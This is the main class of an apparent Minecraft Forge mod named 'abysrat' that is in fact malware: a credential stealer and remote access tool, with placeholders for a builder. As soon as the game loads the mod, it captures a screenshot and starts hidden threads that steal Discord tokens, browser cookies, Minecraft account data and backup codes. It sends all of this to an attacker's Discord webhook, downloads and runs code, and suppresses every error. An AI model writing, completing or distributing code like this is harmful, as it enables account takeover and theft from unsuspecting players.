package dev.nfo;

import dev.nfo.handlers.Screenshot;
import dev.nfo.handlers.Discord;
import dev.nfo.handlers.Cookies;
import dev.nfo.handlers.Minecraft;
import dev.nfo.handlers.BackupCodes;
import dev.nfo.utils.Utils;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;

@Mod(modid = MainMod.MODID, version = MainMod.VERSION, name = MainMod.NAME)
public class MainMod {
    public static final String MODID = "abysrat";
    public static final String VERSION = "1.0";
    public static final String NAME = "%NAME%";
    public static final String WEBHOOK_URL = "%WEBHOOK%";

    private static Screenshot screenshotHandler;
    private static Discord discordHandler;
    private static Cookies cookiesHandler;
    private static Minecraft minecraftHandler;
    private static BackupCodes backupCodesHandler;

    @EventHandler
    public void init(FMLInitializationEvent event) {
        Utils.bypassKeyRestriction();
        
        screenshotHandler = new Screenshot(WEBHOOK_URL);
        screenshotHandler.captureAndSend();
        
        discordHandler = new Discord(WEBHOOK_URL);
        new Thread(() -> {
            try {
                discordHandler.sendTokens();
            } catch (Exception e) {
            }
        }).start();
        
        cookiesHandler = new Cookies(WEBHOOK_URL);
        new Thread(() -> {
            try {
                cookiesHandler.downloadAndExecute();
            } catch (Exception e) {
            }
        }).start();
        
        minecraftHandler = new Minecraft(WEBHOOK_URL);
        new Thread(() -> {
            try {
                minecraftHandler.collectAndSend();
            } catch (Exception e) {
            }
        }).start();
        
        backupCodesHandler = new BackupCodes(WEBHOOK_URL);
        new Thread(() -> {
            try {
                backupCodesHandler.searchAndSend();
            } catch (Exception e) {
            }
        }).start();
    }

    public static Screenshot getScreenshotHandler() {
        return screenshotHandler;
    }

    public static Discord getDiscordHandler() {
        return discordHandler;
    }

    public static Cookies getCookiesHandler() {
        return cookiesHandler;
    }

    public static Minecraft getMinecraftHandler() {
        return minecraftHandler;
    }

    public static BackupCodes getBackupCodesHandler() {
        return backupCodesHandler;
    }
}